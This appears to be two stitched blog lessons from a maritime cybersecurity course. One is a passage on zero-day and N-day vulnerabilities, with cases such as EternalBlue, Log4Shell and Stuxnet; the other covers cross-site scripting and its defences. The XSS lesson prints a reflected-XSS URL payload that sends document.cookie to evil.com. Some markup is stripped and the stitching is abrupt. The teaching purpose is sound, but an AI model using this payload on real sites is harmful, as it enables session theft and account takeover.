The zero-day phase ends; the N-day phase begins for organisations that are now aware of the risk but do not yet have a fix. 4 Patch Released The vendor develops, tests, and releases a patch. The time between disclosure and patch availability ranges from hours (emergency patches) to months for complex OT systems. During this gap, attackers who read the CVE can often reverse-engineer the fix to create a working exploit — this is called "patch diffing" and can produce a working exploit within 24–48 hours of a public patch. 5 Patch Applied (or Not) Organisations apply the patch — or they don't.

Studies consistently show that the majority of successful breaches exploit vulnerabilities for which a patch had been available for months or years. The N-day window can effectively last indefinitely for organisations with poor patch management. In maritime OT, this window routinely extends to years. 2. Zero-Day vs N-Day — Two Different Threats 🔴 Zero-Day Vulnerability unknown to the vendor. No CVE. No patch. No IDS signature. Typically used by nation-state actors and sophisticated criminal groups due to the high cost and expertise required to find or purchase them. Who uses them: APT groups, nation-state actors, high-end ransomware operators. Zerodium pays up to $2.5M per iOS zero-day.

🟠 N-Day (Known-but-Unpatched) Vulnerability is public (has a CVE). A patch exists but has not been applied. The vast majority of real-world breaches exploit N-days, not zero-days — because most organisations patch slowly and attackers know it. Who uses them: Everyone — commodity ransomware, script kiddies, APTs all exploit unpatched known vulnerabilities. They are low-cost and high-yield. Key insight: Despite the media attention on zero-days, N-days cause far more damage at scale. The 2017 WannaCry ransomware attack — which disrupted hospitals, shipping companies, and national infrastructure — exploited EternalBlue, a vulnerability for which Microsoft had released a patch two months earlier .

Organisations that had applied the patch were unaffected. Those that had not were compromised in minutes. 3. Real-World Cases — Zero-Days and N-Days in Action Case 01 EternalBlue (CVE-2017-0144) — WannaCry / NotPetya EternalBlue was an NSA-developed exploit for a vulnerability in Windows SMB (Server Message Block) protocol. It was leaked by the Shadow Brokers hacking group in April 2017. Microsoft had patched the underlying vulnerability (MS17-010) in March 2017 — one month before the leak. In May 2017, WannaCry ransomware weaponised EternalBlue, spreading autonomously across networks without any user interaction. It infected over 230,000 systems in 150 countries within 24 hours.

Maritime impact: Maersk, one of the world's largest shipping companies, was hit by the NotPetya variant (which also used EternalBlue). The attack destroyed approximately 45,000 PCs, 4,000 servers, and 2,500 applications. Maersk was forced to reinstall its entire IT infrastructure — 150 domain controllers, 45,000 PCs — within 10 days. Estimated loss: USD 300 million. The entire port of Rotterdam's APM Terminals was shut down temporarily, halting cargo operations. Lesson: EternalBlue was an N-day at the time of WannaCry — the patch had been available for two months. Organisations that applied the patch were not affected.

This is the most consequential example of the N-day threat in maritime history. Case 02 Log4Shell (CVE-2021-44228) — Log4j Remote Code Execution Log4Shell was a zero-day in Apache Log4j, a Java logging library embedded in hundreds of thousands of products — from enterprise software to maritime management platforms. Disclosed in December 2021, the vulnerability allowed unauthenticated remote code execution with a single malicious string in any field that Log4j processed — including HTTP headers, usernames, and log messages. Because Log4j was so widely embedded, most operators did not even know they were running it.

Exploitation timeline: Within 12 hours of public disclosure, mass exploitation began. Over 100 distinct threat actors — including nation-state groups from Iran, North Korea, China, and Turkey — were observed exploiting it within days. The CISA director described it as "the most serious vulnerability I've seen in my decades-long career." Maritime relevance: Vessel management systems, fleet operations software, and port management platforms built on Java stacks were affected. Many operators discovered they were running Log4j only after scrambling to inventory their software — illustrating the "hidden dependency" problem common in maritime IT.

Case 03 Stuxnet — The First Weaponised Zero-Day Worm Stuxnet, discovered in 2010 and attributed to the US and Israel, used four zero-day vulnerabilities simultaneously to target Siemens PLCs controlling Iranian nuclear centrifuges. It spread via USB, infected Windows systems silently, and then specifically targeted Siemens Step 7 software — sabotaging the centrifuges while reporting normal operation to operators. It demonstrated that zero-days could be chained to cause physical damage to industrial systems. OT significance: Stuxnet proved that ICS/OT systems — including shipboard automation, engine management, and cargo control — are viable zero-day targets.

IACS UR E26 requirements for OT network segregation and patch management were partly informed by lessons from ICS attacks like Stuxnet. 4. Why Maritime OT Systems Face Heightened Zero-Day Risk Maritime OT Vulnerability Factors Extended Patch Cycles Vessel OT systems are often updated only during scheduled dry-dock — every 2.5 to 5 years. A zero-day or N-day discovered between dry-docks can remain exploitable for years. At-sea patch delivery via satellite is constrained by bandwidth and vendor approval processes. Legacy Software Stacks ECDIS, engine management, and cargo automation systems are frequently built on Windows XP, Windows 7, or embedded OS versions that are out of Microsoft support.

Vulnerabilities in these end-of-life platforms receive no patches — every vulnerability is effectively permanent. Limited Monitoring Most vessels lack the EDR (Endpoint Detection and Response) tools, SIEM infrastructure, and SOC connectivity needed to detect zero-day exploitation. Attackers can persist on shipboard systems for extended periods undetected — the average dwell time before detection on OT networks globally is over 200 days. Connectivity as Attack Surface VSAT and LTE connectivity expose vessel systems to the internet. Remote maintenance connections (vendor VPNs, remote desktop) are frequently left open or poorly configured.

Each connection is a potential zero-day delivery channel. USB ports used for chart updates introduce removable media risk — the same vector used by Stuxnet. Regulatory Context IACS UR E26 (mandatory for vessels contracted from January 2024) requires cyber resilience including vulnerability management, patch management procedures, and network segmentation. This directly addresses the zero-day and N-day exposure profile — but compliance varies, and implementation quality ranges widely. 5. Defences — Reducing Zero-Day and N-Day Exposure ⚡ Rapid Patch Management The single most effective defence against N-days.

Prioritise critical and high-severity patches (CVSS ≥ 7.0) within 14 days; apply all patches within 30 days. Maintain an accurate asset inventory so nothing is missed. For maritime OT, establish remote patch delivery procedures and get vendor approval processes in place before a critical patch is needed. 🛡️ Virtual Patching (IPS/WAF Rules) When a patch cannot be applied immediately — because the system is critical, the patch has not been tested, or the system is at sea — a virtual patch can block exploitation without modifying the vulnerable software.

An Intrusion Prevention System (IPS) or Web Application Firewall (WAF) rule is created that blocks the specific traffic pattern the exploit uses. Virtual patching buys time; it is not a permanent fix. 🔒 Network Segmentation Even if a zero-day compromises one system, segmentation limits lateral movement. On a vessel, the OT network (engine management, cargo, navigation) must be isolated from the IT network (crew internet, administrative systems). A zero-day exploited through a crew laptop should never reach the bridge systems. IACS UR E26 mandates this separation. In practice, it is one of the most commonly failed controls on vessel assessments.

🔍 Threat Intelligence & Vulnerability Monitoring Subscribe to CVE feeds (NVD, CISA KEV) and vendor security bulletins. The CISA Known Exploited Vulnerabilities (KEV) catalogue lists CVEs confirmed to be actively exploited in the wild — these must be treated as highest priority. For maritime, BIMCO and IACS publish security advisories relevant to vessel systems. Know what software you run so you can act when a relevant CVE drops. 🚫 Attack Surface Reduction Disable unused services, close unnecessary ports, remove unneeded software, and block USB ports where chart updates can be delivered via other means. Every service that is not running cannot be exploited.

Applying the principle of least privilege — users and systems have only the access they need — limits what an attacker can do even after a zero-day gives them initial access. 🔎 Behavioural Detection (EDR / SIEM) Zero-days have no signatures — but exploits produce behaviour. An EDR (Endpoint Detection and Response) tool monitors for anomalous process creation, unusual network connections, and privilege escalation attempts that are characteristic of post-exploitation activity, even when the initial vulnerability is unknown. Connecting vessel systems to a shore-based SIEM enables detection and response within the exploitation window, rather than discovering an incident months later.

✍️ Author Insight — From the Field Captain Paul · Maritime Cybersecurity Consultant · IACS UR E26/E27 During E26 CRSI assessments, the zero-day and N-day question becomes very concrete very quickly: show me your patch register. In the vast majority of assessments, the patch register either does not exist, has not been updated since the last dry-dock, or lists software versions that have had critical CVEs published against them for years.

The theoretical elegance of zero-day research matters far less to the vessel operator than the practical reality that their ECDIS is running a version with a known remote code execution CVE and no plan to patch it before the next scheduled maintenance window in 18 months. The segmentation finding is equally consistent. Bridge systems, engine management systems, and crew internet access routinely share the same network segment — or are connected through a firewall configuration that has never been reviewed since installation.

A crew member clicking a phishing link (Lesson 6) on the crew Wi-Fi network, on a vessel where the OT network is not properly segregated, can deliver an N-day payload that reaches bridge navigation systems. The attack chain does not require a sophisticated zero-day — it requires a known CVE and a missing firewall rule. Practical first step: Run a vulnerability scan against your vessel's accessible systems before the next dry-dock. Cross-reference findings against the CISA KEV catalogue. Any system with a KEV-listed CVE has a confirmed-exploited-in-the-wild vulnerability and must be escalated immediately — not deferred to the next maintenance window.
✅ Key Takeaways — Lesson 12 A zero-day is a vulnerability unknown to the vendor — no patch, no CVE, no s

posts.t: Cross-Site Scripting (XSS) — Maritime Cybersecurity Learning (Lesson 11)
c: 📚 Series Maritime Cybersecurity Learning Roadmap | PART 2 Lesson 11 of 7 · Course Index → Cross-Site Scripting (XSS) Reflected XSS · Stored XSS · DOM-based XSS · Cookie Theft · Session Hijacking · Content Security Policy · Output Encoding · Cookie Security Flags — script injection into trusted web pages that executes in a victim's browser.

Captain Paul Maritime Cybersecurity · IACS UR E26/E27 September 2026 🎯 Lesson Objective After this lesson you can explain what XSS is and why it differs from SQL Injection, describe the three XSS types (Reflected, Stored, DOM-based), explain how Stored XSS enables persistent session hijacking through cookie theft, explain the role of Content Security Policy (CSP) in blocking unauthorised scripts, and describe the HTTPOnly and Secure cookie flags as a key defence against cookie theft. SQL Injection targets the server — it manipulates a database.

Cross-Site Scripting (XSS) targets the user — it injects malicious JavaScript into a web page that executes in the victim's browser, in the context of the trusted site. Because the script runs from within the trusted domain, the browser does not treat it as foreign. The script has access to everything on the page: the DOM, stored cookies, session tokens, form inputs, and potentially the ability to make authenticated requests to the server. XSS has appeared on the OWASP Top 10 since the list's inception and remains one of the most prevalent web application vulnerabilities.

Its popularity as an attack vector is driven by the ubiquity of web applications, the wide range of browser APIs accessible to injected scripts, and the fact that the attack is invisible to the victim — they see no indication that a script is exfiltrating their session cookie to a remote server. The root cause mirrors SQL Injection: user-supplied content is rendered in a page without proper encoding, allowing the browser to interpret it as HTML and JavaScript rather than as text. The fix is equally clear: encode all output before rendering it in a browser context.

And like SQLi, the vulnerability persists because it is not always obvious which data paths require encoding and because legacy codebases often predate awareness of the issue. 1. The Three Types of Cross-Site Scripting 🔁 Reflected XSS (Non-Persistent) The malicious script is embedded in a URL parameter. When the victim clicks the crafted URL, the server includes the parameter's value in the HTML response — without encoding it — and the browser executes it. The script exists only in the URL; it is not stored anywhere on the server.

Example attack chain: Attacker crafts a URL to a vulnerable search page: https://portal.example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script> — the victim clicks the link (delivered via email or social media), the script fires in their browser, and their session cookie is sent to the attacker's server. Delivery: Typically via phishing emails, malicious links in messages, or crafted URLs shared in forums or documents.

💾 Stored XSS (Persistent) The malicious script is stored permanently in the server's database — in a comment field, a message, a profile description, a vessel name, or any user-submitted content that is later retrieved and displayed to other users. Every user who views the page containing the stored script becomes a victim. No interaction beyond visiting the page is required. Why it is more dangerous: Stored XSS does not require social engineering to deliver. An attacker who gains access to any input field that persists data can attack every subsequent visitor — potentially including administrators, whose elevated session tokens are of particular value.

A single injected payload in a fleet management portal's vessel name field or crew comment section could persist until the database is cleansed. Maritime example: An attacker with access to a vessel record updates a comments field with an XSS payload. Every fleet manager who views the vessel details page is silently compromised. 🔧 DOM-based XSS The vulnerability exists entirely in client-side JavaScript. The page's own JavaScript reads an attacker-controlled value (from the URL hash, a query parameter, or document.referrer) and writes it into the DOM without encoding.

The server sends a perfectly safe response — the malicious script is constructed by the browser itself from the attacker-controlled source. DOM-based XSS is particularly difficult to detect with server-side scanners because the vulnerability is invisible in server responses. Common source: Single-page applications (SPAs) that use location.hash or URLSearchParams values to render page content without encoding. 2. What an XSS Payload Can Do XSS Payload Capabilities — Same Origin Context Cookie Theft document.cookie exposes all non-HttpOnly cookies for the domain.

A payload sending this to an attacker's server provides the session token — allowing the attacker to authenticate as the victim from a different machine without knowing the password. Keylogging An injected script can attach an event listener to every keypress on the page and exfiltrate the user's input — capturing credentials typed into login forms after the session is already established, or during a re-authentication prompt. Credential Phishing The script can overlay a fake login form over the legitimate page, asking the user to re-enter credentials. Because the URL remains the legitimate site's domain, the user has no visual reason to distrust the prompt.

Account Takeover With a valid session token (from cookie theft), the attacker can make authenticated API calls — changing the victim's email address, exfiltrating data, or performing administrative actions if the victim is an admin. CSRF Token Bypass XSS breaks the CSRF defences of the same application — the script can read the CSRF token from the DOM and use it to forge authenticated requests, bypassing the primary defence against Cross-Site Request Forgery. 3. Defences — How to Prevent XSS 📝 Output Encoding The primary defence.

Before any user-supplied data is rendered in an HTML page, it must be HTML-encoded so that special characters are converted to their safe representation: < becomes < , > becomes > , and so on. The browser renders these as text characters, never as HTML tags or script elements. Context-aware encoding must be applied — HTML encoding, JavaScript encoding, and URL encoding are different and context-specific. 🛡️ Content Security Policy (CSP) CSP is an HTTP response header that tells the browser which script sources it is allowed to execute. A properly configured CSP blocks all inline scripts ( <script> tags injected via XSS) and limits external scripts to approved domains.

Even if an XSS vulnerability exists, CSP prevents the injected script from executing. A strict CSP is one of the most effective compensating controls against XSS exploitation. 🍪 HTTPOnly Cookie Flag Setting the HttpOnly flag on session cookies prevents JavaScript from accessing them — document.cookie will not include HttpOnly cookies. This eliminates the most common XSS payload objective: cookie theft. The attacker can still perform actions in the browser context, but cannot extract the session token to authenticate from another machine. 🔐 Secure Cookie Flag & SameSite The Secure flag ensures cookies are only sent over HTTPS connections, preventing interception on unencrypted channels.

The SameSite attribute ( Strict or Lax ) controls whether cookies are sent with cross-site requests, reducing the risk of Cross-Site Request Forgery (CSRF) and some XSS-assisted attacks. ✍️ Author Insight — From the Field Captain Paul · Maritime Cybersecurity Consultant · IACS UR E26/E27 During E26 CRSI assessments, XSS findings are encountered in maritime web portals more often than many operators expect. The typical scenario involves web applications built on top of relational databases containing crew and vessel data, where user-supplied text fields — vessel remarks, crew comments, notification messages — are stored and rendered back to administrators without HTML encoding.

The most consequential variant observed is Stored XSS targeting administrative users. An attacker who can submit a comment or record update through a lower-privilege account can potentially compromise an administrative session that later views the same data. Given that administrative accounts in fleet management systems often have access to the full crew database, vessel compliance records, and system configuration, the resulting impact can be far disproportionate to the initial access level required. Quick validation test: Enter test in any text field that is displayed back to users.

If the word "test" appears in bold in the rendered page, the application is not encoding output and is likely vulnerable to XSS. This single test — taking under ten seconds — is sufficient to identify the vulnerability class and justify escalation. ✅ Key Takeaways — Lesson 11 XSS injects malicious JavaScript into a trusted web page, which executes in the victim's browser with the page's full DOM access. Reflected XSS is delivered via crafted URLs; Stored XSS persists in the server database and attacks every visitor; DOM-based XSS exists entirely in client-side JavaScript.

The most common XSS objective is cookie theft — stealing the session token to authenticate as the victim without needing a password. Output encoding (HTML-encoding all user-supplied data before rendering) is the primary defence. The HTTPOnly cookie flag prevents JavaScript from reading session cookies, eliminating cookie theft even when XSS is present. Content Security Policy (CSP) prevents injected scripts from executing — a critical compensating control for applications where encoding all outputs is complex. A quick test: enter test in input fields and check if "test" renders bold. Bold output means no output encoding.

▶ Next — Lesson 12 Lesson 12 — Zero-Day Vulnerabilities and Exploits covers software flaws unknown to the vendor — the CVE lifecycle, zero-day vs N-day threats, real-world cases (EternalBlue, Log4Shell, Stuxnet), and why maritime OT systems face heightened zero-day exposure. We also cover the key defences: patch management, virtual patching, and network segmentation.
